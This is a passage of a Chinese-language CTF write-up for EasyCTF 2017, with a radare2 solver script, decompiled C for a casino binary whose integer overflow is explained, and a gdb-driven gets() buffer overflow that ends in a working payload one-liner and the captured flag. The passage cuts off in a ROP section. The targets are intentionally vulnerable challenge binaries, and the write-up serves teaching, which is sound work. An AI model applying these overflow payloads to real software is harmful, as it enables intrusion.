class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> r2pipe</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="comment"># shift arithmetic right copied from http://stackoverflow.com/a/5833119</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rshift</span><span class="params">(val, n)</span>:</span> </div><div class="line">    <span class="keyword">return</span> val&gt;&gt;n <span class="keyword">if</span> val &gt;= <span class="number">0</span> <span class="keyword">else</span> (val+<span class="number">0x100000000</span>)&gt;&gt;n</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line"></div><div class="line">    r2p = r2pipe.open(sys.argv[<span class="number">1</span>])</div><div class="line">    r2p.cmd(<span class="string">"aaa"</span>)</div><div class="line"></div><div class="line">    <span class="comment"># get the name of the function that does the operation</span></div><div class="line">    t = r2p.cmd(<span class="string">"aflj"</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    fc_name = d[<span class="number">0</span>][<span class="string">"name"</span>]</div><div class="line">    <span class="keyword">if</span> fc_name == <span class="string">"entry0"</span>:</div><div class="line">        fc_name = d[<span class="number">1</span>][<span class="string">"name"</span>]</div><div class="line"></div><div class="line">    <span class="comment"># determine if sub, add, or xor is used</span></div><div class="line">    t = r2p.cmd(<span class="string">"pdj 1@%s"</span> %( fc_name))</div><div class="line">    d = json.loads(t)</div><div class="line">    ins = d[<span class="number">0</span>][<span class="string">"opcode"</span>]</div><div class="line"></div><div class="line">    <span class="comment"># get the value of EAX</span></div><div class="line">    t = r2p.cmd(<span class="string">"pdj 1@entry0+0x1f"</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    pointer = d[<span class="number">0</span>][<span class="string">"esil"</span>].split(<span class="string">","</span>)[<span class="number">0</span>]</div><div class="line">    pointer = int(pointer, <span class="number">16</span>)</div><div class="line">    t = r2p.cmd(<span class="string">"pxrj 4@%d"</span> % (pointer,))</div><div class="line">    d = json.loads(t)</div><div class="line">    eax = d[<span class="number">0</span>][<span class="string">"value"</span>]</div><div class="line"></div><div class="line">    <span class="comment"># get the value of ECX</span></div><div class="line">    t = r2p.cmd(<span class="string">"pdj 1@entry0+0x24"</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    ecx = d[<span class="number">0</span>][<span class="string">"opcode"</span>].split()[<span class="number">-1</span>]</div><div class="line">    ecx = int(ecx, <span class="number">16</span>)</div><div class="line"></div><div class="line">    <span class="comment"># determine the operation used by do_foo()</span></div><div class="line">    answer = <span class="number">0</span></div><div class="line">    <span class="keyword">if</span> <span class="string">"sub"</span> <span class="keyword">in</span> ins:</div><div class="line">        answer = eax - ecx</div><div class="line">    <span class="keyword">elif</span> <span class="string">"xor"</span> <span class="keyword">in</span> ins:</div><div class="line">        answer = eax ^ ecx</div><div class="line">    <span class="keyword">elif</span> <span class="string">"add"</span> <span class="keyword">in</span> ins:</div><div class="line">        answer = eax + ecx</div><div class="line"></div><div class="line">    <span class="comment"># get value to use for SAR operation</span></div><div class="line">    t = r2p.cmd(<span class="string">"pdj 1@entry0+0x36"</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    pointer = d[<span class="number">0</span>][<span class="string">"esil"</span>].split(<span class="string">","</span>)[<span class="number">0</span>]</div><div class="line">    pointer = int(pointer, <span class="number">16</span>)</div><div class="line"></div><div class="line">    t = r2p.cmd(<span class="string">"pxrj 4@%d"</span> % (pointer,))</div><div class="line">    t = t.replace(<span class="string">"\\x"</span>, <span class="string">""</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    val = d[<span class="number">0</span>][<span class="string">"value"</span>]</div><div class="line">    cl = val &amp; <span class="number">0xFF</span></div><div class="line"></div><div class="line">    <span class="comment"># get the solution to the challenge</span></div><div class="line">    solve = rshift(answer, cl)</div><div class="line">    solve = solve &amp; <span class="number">0xff</span></div><div class="line">    sys.stdout.write(<span class="string">"%c"</span> % (solve,))</div></pre></td></tr></table></figure><p></p><h2 id="Heaps-of-Knowledge"><a href="#Heaps-of-Knowledge" class="headerlink" title="Heaps of Knowledge"></a>Heaps of Knowledge</h2><h3 id="problem-7"><a href="#problem-7" class="headerlink" title="problem"></a>problem</h3><p>Can you pwn this? Navigate to <code>/problems/heaps_of_knowledge/</code> on the shell server and read <code>flag.txt</code>.</p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/heaps_of_knowledge/heaps_of_knowledge" target="_blank" rel="external">Binary</a></p><h3 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/VulnHub/ctf-writeups/blob/master/2017/easyctf/heaps-of-knowledge.md" target="_blank" rel="external">writeup</a></p><h2 id="Morphin"><a href="#Morphin" class="headerlink" title="Morphin"></a>Morphin</h2><p>Welcome to the RE training course, this problem has 4 phases. Solve all four to get the flag.</p><p>Note: On phase 1 round to 6 significant figures.</p><p>Download</p><p><a href="https://writeups.easyctf.com/reverse-engineering.html" target="_blank" rel="external">writeup</a></p><h1 id="0x07-Binary-Exploitation"><a href="#0x07-Binary-Exploitation" class="headerlink" title="0x07 Binary Exploitation"></a>0x07 Binary Exploitation</h1><h2 id="Risky-Business"><a href="#Risky-Business" class="headerlink" title="Risky Business"></a>Risky Business</h2><h3 id="problem-8"><a href="#problem-8" class="headerlink" title="problem"></a>problem</h3><p>We wanted to branch into the casino business, but human employees are too expensive so we decided to automate it. I feel like we missed something obvious though… Oh well! Here’s the binary: <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/risky-business/casino" target="_blank" rel="external">casino</a></p><p>Solve this problem by logging into the shell server and navigating to <code>/problems/casino</code>.<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  __int64 v3; <span class="comment">// rax@1</span></div><div class="line">  __int64 v4; <span class="comment">// rdx@1</span></div><div class="line">  __int64 v5; <span class="comment">// rax@1</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// ebx@2</span></div><div class="line">  __int64 v7; <span class="comment">// rdx@2</span></div><div class="line">  __int64 v8; <span class="comment">// rax@2</span></div><div class="line">  __int64 v9; <span class="comment">// rax@2</span></div><div class="line">  __int64 v10; <span class="comment">// rdi@2</span></div><div class="line">  __int64 v11; <span class="comment">// rdx@2</span></div><div class="line">  __int64 v13; <span class="comment">// rax@4</span></div><div class="line">  <span class="keyword">int</span> v14; <span class="comment">// eax@4</span></div><div class="line">  __int64 v15; <span class="comment">// rdx@4</span></div><div class="line">  <span class="keyword">bool</span> v16; <span class="comment">// al@6</span></div><div class="line">  __int64 v17; <span class="comment">// rax@11</span></div><div class="line">  __int64 v18; <span class="comment">// rax@13</span></div><div class="line">  __int64 v19; <span class="comment">// rdx@14</span></div><div class="line">  __int64 v20; <span class="comment">// rax@15</span></div><div class="line">  __int64 v21; <span class="comment">// rax@16</span></div><div class="line">  <span class="keyword">int</span> v22; <span class="comment">// [sp+Ch] [bp-1C4h]@4</span></div><div class="line">  <span class="keyword">char</span> v23; <span class="comment">// [sp+10h] [bp-1C0h]@4</span></div><div class="line">  <span class="keyword">char</span> v24; <span class="comment">// [sp+30h] [bp-1A0h]@4</span></div><div class="line">  __int64 v25; <span class="comment">// [sp+B0h] [bp-120h]@4</span></div><div class="line">  __int64 v26; <span class="comment">// [sp+1B8h] [bp-18h]@1</span></div><div class="line"></div><div class="line">  v26 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  LODWORD(v3) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Welcome to the EasyCTF 2017 Casino"</span>, envp);</div><div class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">  LODWORD(v5) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</div><div class="line">                  &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</div><div class="line">                  <span class="string">"Try your luck and gain access to our exclusive club!"</span>,</div><div class="line">                  v4);</div><div class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">    v6 = networth;</div><div class="line">    LODWORD(v8) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Your net worth is: $"</span>, v7);</div><div class="line">    LODWORD(v9) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6);</div><div class="line">    v10 = v9;</div><div class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">    <span class="keyword">if</span> ( networth &gt; <span class="number">2000000000</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    LODWORD(v13) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</div><div class="line">                     &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</div><div class="line">                     <span class="string">"Please enter how much you would like to bet:"</span>,</div><div class="line">                     v11);</div><div class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v13, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v23);</div><div class="line">    <span class="built_in">std</span>::getline&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;_TMC_END__, &amp;v23);</div><div class="line">    v14 = <span class="built_in">std</span>::<span class="keyword">operator</span>|(<span class="number">16L</span>L, <span class="number">8L</span>L);</div><div class="line">    <span class="built_in">std</span>::__cxx11::basic_stringstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_stringstream(</div><div class="line">      &amp;v24,</div><div class="line">      &amp;v23,</div><div class="line">      (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v14);</div><div class="line">    <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;v24, &amp;v22);</div><div class="line">    v16 = (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::eof(&amp;v25) ^ <span class="number">1</span></div><div class="line">       || (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::fail(&amp;v25);</div><div class="line">    <span class="keyword">if</span> ( v16 )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"That was not a valid number :("</span>, v15);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v22 &gt; <span class="number">0</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( v22 &lt;= <span class="number">100000000</span> )</div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)gamble() ^ <span class="number">1</span> )</div><div class="line">        &#123;</div><div class="line">          LODWORD(v20) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Sorry, I'm afraid you've lost :("</span>, v19);</div><div class="line">          <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">          networth -= v22;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">          LODWORD(v21) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Congratulations, you won!"</span>, v19);</div><div class="line">          <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v21, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">          networth += v22;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">else</span></div><div class="line">      &#123;</div><div class="line">        LODWORD(v18) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</div><div class="line">                         &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</div><div class="line">                         <span class="string">"Sorry, the most we can allow you to bet is $100,000,000"</span>,</div><div class="line">                         v15);</div><div class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v18, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      LODWORD(v17) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"You must bet a positive amount"</span>, v15);</div><div class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v17, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">std</span>::__cxx11::basic_stringstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_stringstream((__int64)&amp;v24);</div><div class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v23);</div><div class="line">  &#125;</div><div class="line">  printflag(v10, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;, v11);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p></p><p><img src="http://i4.buimg.com/589513/458cf5848cda5d98.png" alt=""></p><p>整型溢出问题，大致先看了一下逻辑，只要满足networth &gt; 2000000000就可以跳出while循环获取到flag，network是int类型的，而在：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)gamble() ^ <span class="number">1</span> )</div><div class="line">&#123;</div><div class="line">  LODWORD(v20) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Sorry, I'm afraid you've lost :("</span>, v19);</div><div class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">  networth -= v22;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p></p><p><img src="http://i4.buimg.com/589513/601f78cff8149259.png" alt=""></p><p>中并没有先判断network值是否小于0就直接相减，这样导致余额为负也还可以继续赌(和)博（谐）：</p><p><img src="http://i2.muimg.com/589513/825bd842a912a237.png" alt=""></p><p>32位下int: 4 byte = 32 bit 有符号signed范围：2^31-1 ~ -2^31 即：2147483647 ~ -2147483648，当我们的余额小于还小于-2147483648时就会溢出，而溢出处理是环形的，画个简图：</p><p><img src="http://i2.muimg.com/589513/ff66d77073b68805.png" alt=""></p><p><img src="http://i1.piimg.com/589513/6c4cd7da413afb24.png" alt=""></p><h2 id="Doubly-Dangerous"><a href="#Doubly-Dangerous" class="headerlink" title="Doubly Dangerous"></a>Doubly Dangerous</h2><h3 id="problem-9"><a href="#problem-9" class="headerlink" title="problem"></a>problem</h3><p>There seems to be an issue with <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/doubly-dangerous/doubly_dangerous" target="_blank" rel="external">this binary</a>. Can you exploit it? View the problem in the shell server <code>/problems/doubly_dangerous</code> directory.</p><h3 id="solution-8"><a href="#solution-8" class="headerlink" title="solution"></a>solution</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+Ch] [bp-4Ch]@1</span></div><div class="line">  <span class="keyword">float</span> v5; <span class="comment">// [sp+4Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v5 = <span class="number">0.0</span>;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Give me a string: "</span>);</div><div class="line">  gets(&amp;s);</div><div class="line">  <span class="keyword">if</span> ( <span class="number">11.28125</span> == v5 )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Success! Here is your flag:"</span>);</div><div class="line">    give_flag();</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"nope!"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>我们要做的就是让<code>if ( 11.28125 == v5 )</code>成立，又使用了<code>gets()</code>,估计与溢出有关。<br>运行一下：</p><pre><code>sunnyelf@ubuntu:~/Desktop$ ./doubly_dangerous Give me a string: flagnope!sunnyelf@ubuntu:~/Desktop$ ./doubly_dangerousGive me a string: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnope!Segmentation fault (core dumped)</code></pre><p>果然是溢出，于是gdb看一下：</p><pre><code>(gdb) set disassembly-flavor intel(gdb) disas mainDump of assembler code for function main:   0x08048607 &lt;+0&gt;:    lea    ecx,[esp+0x4]   0x0804860b &lt;+4&gt;:    and    esp,0xfffffff0   0x0804860e &lt;+7&gt;:    push   DWORD PTR [ecx-0x4]   0x08048611 &lt;+10&gt;:    push   ebp   0x08048612 &lt;+11&gt;:    mov    ebp,esp   0x08048614 &lt;+13&gt;:    push   ecx   0x08048615 &lt;+14&gt;:    sub    esp,0x54   0x08048618 &lt;+17&gt;:    fldz      0x0804861a &lt;+19&gt;:    fstp   DWORD PTR [ebp-0xc]   0x0804861d &lt;+22&gt;:    sub    esp,0xc   0x08048620 &lt;+25&gt;:    push   0x8048735   0x08048625 &lt;+30&gt;:    call   0x8048410 &lt;puts@plt&gt;   0x0804862a &lt;+35&gt;:    add    esp,0x10   0x0804862d &lt;+38&gt;:    sub    esp,0xc   0x08048630 &lt;+41&gt;:    lea    eax,[ebp-0x4c]   0x08048633 &lt;+44&gt;:    push   eax   0x08048634 &lt;+45&gt;:    call   0x80483e0 &lt;gets@plt&gt;   0x08048639 &lt;+50&gt;:    add    esp,0x10   0x0804863c &lt;+53&gt;:    fld    DWORD PTR [ebp-0xc]   0x0804863f &lt;+56&gt;:    fld    DWORD PTR ds:0x804876c   0x08048645 &lt;+62&gt;:    fucomip st,st(1)   0x08048647 &lt;+64&gt;:    jp     0x804866c &lt;main+101&gt;---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---c   0x08048649 &lt;+66&gt;:    fld    DWORD PTR ds:0x804876c   0x0804864f &lt;+72&gt;:    fucomip st,st(1)   0x08048651 &lt;+74&gt;:    fstp   st(0)   0x08048653 &lt;+76&gt;:    jne    0x804866e &lt;main+103&gt;   0x08048655 &lt;+78&gt;:    sub    esp,0xc   0x08048658 &lt;+81&gt;:    push   0x8048748   0x0804865d &lt;+86&gt;:    call   0x8048410 &lt;puts@plt&gt;   0x08048662 &lt;+91&gt;:    add    esp,0x10   0x08048665 &lt;+94&gt;:    call   0x804857b &lt;give_flag&gt;   0x0804866a &lt;+99&gt;:    jmp    0x804867e &lt;main+119&gt;   0x0804866c &lt;+101&gt;:    fstp   st(0)   0x0804866e &lt;+103&gt;:    sub    esp,0xc   0x08048671 &lt;+106&gt;:    push   0x8048764   0x08048676 &lt;+111&gt;:    call   0x8048410 &lt;puts@plt&gt;   0x0804867b &lt;+116&gt;:    add    esp,0x10   0x0804867e &lt;+119&gt;:    mov    eax,0x0   0x08048683 &lt;+124&gt;:    mov    ecx,DWORD PTR [ebp-0x4]   0x08048686 &lt;+127&gt;:    leave     0x08048687 &lt;+128&gt;:    lea    esp,[ecx-0x4]   0x0804868a &lt;+131&gt;:    ret    End of assembler dump.</code></pre><p>大致看了之后，看到其中的：</p><pre><code>0x0804863c &lt;+53&gt;:    fld    DWORD PTR [ebp-0xc]0x0804863f &lt;+56&gt;:    fld    DWORD PTR ds:0x804876c0x08048645 &lt;+62&gt;:    fucomip st,st(1)</code></pre><p>根据题意就是溢出覆盖<code>ebp-0xc</code>的值使之和<code>0x804876c</code>所指的值相等。于是不断尝试输入查看<code>ebp-0xc</code>所指的值的变化，当输入64个A字符时没有覆盖：</p><pre><code>(gdb) set disassembly-flavor intel(gdb) b mainBreakpoint 1 at 0x8048615(gdb) r &lt; 64A.txt Starting program: /home/sunnyelf/Desktop/doubly_dangerous &lt; 64A.txtBreakpoint 1, 0x08048615 in main ()(gdb) x/wx $ebp-0xc0xbffff0fc: 0x080486b1</code></pre><p>当输入65个A字符时开始覆盖（A字符的ASCII码的十六进制是41）：</p><pre><code>(gdb) r &lt; 65A.txt Starting program: /home/sunnyelf/Desktop/doubly_dangerous &lt; 65A.txtBreakpoint 1, 0x08048615 in main ()(gdb) x/wx $ebp-0xc0xbffff0fc:    0x08048641</code></pre><p>接下再看一下<code>0x804876c</code>所指的值：</p><pre><code>(gdb) x/wx 0x804876c0x804876c: 0x41348000</code></pre><p>于是构造payload：<code>&#39;A&#39; * 64 + &#39;\x00\x80\x34\x41&#39;</code></p><pre><code>python -c &quot;print &apos;A&apos;*64 + &apos;\x00\x80\x34\x41&apos;&quot; | ./doubly_dangerousGive me a string: Success! Here is your flag:easyctf{bofs_and_floats_are_d0uble_tr0uble!}</code></pre><h2 id="Simple-Rop"><a href="#Simple-Rop" class="headerlink" title="Simple Rop"></a>Simple Rop</h2><h3 id="problem-10"><a href="#problem-10" class="headerlink" title="problem"></a>problem</h3><p>On the shell there is a folder <code>/problems/simple-rop</code>.</p><p>Read <code>flag.txt</code></p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/simple-rop/simple-rop.c" target="_blank" rel="external">Source</a></p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/simple-rop/simple-rop" target="_blank" rel="external">Binary</a></p><h3 id="solution-9"><a href="#solution-9" class="headerlink" title="solution"></a>solution</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// simple-rop.c</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 